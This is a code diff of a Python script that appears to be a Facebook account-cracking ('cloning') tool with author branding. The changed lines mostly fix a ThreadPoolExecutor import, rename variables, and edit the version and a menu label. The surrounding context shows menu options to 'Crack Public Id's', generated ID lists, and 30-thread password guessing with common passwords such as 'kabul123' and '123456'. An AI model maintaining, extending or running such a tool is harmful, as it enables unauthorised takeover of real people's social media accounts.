@@ -27,7 +27,7 @@ import random
 import platform
 import base64
 import subprocess
-from concurrent.futures import ThreadPool
+from concurrent.futures import ThreadPoolExecutor
 import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
 try:
 	import rich
@@ -41,7 +41,7 @@ except ImportError:
 from rich.table import Table as me
 from rich.console import Console as sol
 from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPool as yaari
+from concurrent.futures import ThreadPoolExecutor as tred
 from rich.console import Group as gp
 from rich.panel import Panel as nel
 import base64
@@ -393,7 +393,7 @@ logo = """\033[1;30m
 \033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32m SAADAT TECHZNICAL
 \033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33m RAZIEQ ULLAH SAADAT
 \033[1;39m━▷ \033[0;91m𝙎𝘼𝙏𝙐𝙏𝘼𝙎  \033[1;39m◈✙◈ \033[0;92mFREE RNDM
-\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.0.3
+\033[1;39m━▷ \033[0;91m𝙑𝙀𝙍𝙎𝙄𝙊𝙉  \033[1;39m◈✙◈ \033[1;31m2.0.2
 \033[1;39m━▷ \033[1;36m𝙁𝙀𝙀𝙇 𝙏𝙃𝙀 𝙋𝙊𝙒𝙀𝙍 𝙊𝙁 SAADAT
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37mSAADAT\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●"""
  
@@ -439,7 +439,7 @@ class Main:
 		print(" \033[1;39m━▷ \033[1;32m【2】 \033[1;34mCrack Public Id's")
 		print(" \033[1;39m━▷ \033[1;33m【3】 \033[1;33mFacebook Group help ")
 		print(" \033[1;39m━▷ \033[1;34m【4】 \033[1;32mOld Cloning Id's 2006-10 \033[0;92m ✓ (Best)")
-		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37mAfghanistan New Id's 2011-2023\033[0;92m  ✓ (Best) ")
+		print(" \033[1;39m━▷ \033[1;35m【5】 \033[1;37mAfghanista New Id's 2011-2023\033[0;92m  ✓ (Best) ")
 		print(" \033[1;39m━▷ \033[0;91m【E】 Exit \n")
 		MAINUL =input(" \033[1;35mChoice : ")
 		if MAINUL in ["1", "01"]:
@@ -475,7 +475,7 @@ class Main:
 				self.id.append(__+str(_))
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
-			with ThreadPool(max_workers=30)as yaari:
+			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\033[1;32m [1] Ex(123456) FOR Old IDZ\033[1;37m ")
 				print("\n\033[1;32m [2] Ex(Afghan123,kabul123,khan123,kabul1234..,) FOR New IDZ\033[1;37m ")
 				listpass = input("%s [1] ENTER PASSWORD :%s "%(G,Y))
@@ -910,7 +910,7 @@ class Main:
 				self.id.append(__+str(_))
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
-			with ThreadPool(max_workers=30) as yaari:
+			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\033[1;32m [1] Ex(123456) FOR Old IDZ\033[1;37m ")
 				print("\n\033[1;32m [2] Ex(Afghan123,kabul123,khan123,kabul1234..') FOR New IDZ\033[1;37m ")
 				listpass = input("%s [1] ENTER PASSWORD :%s "%(G,Y))
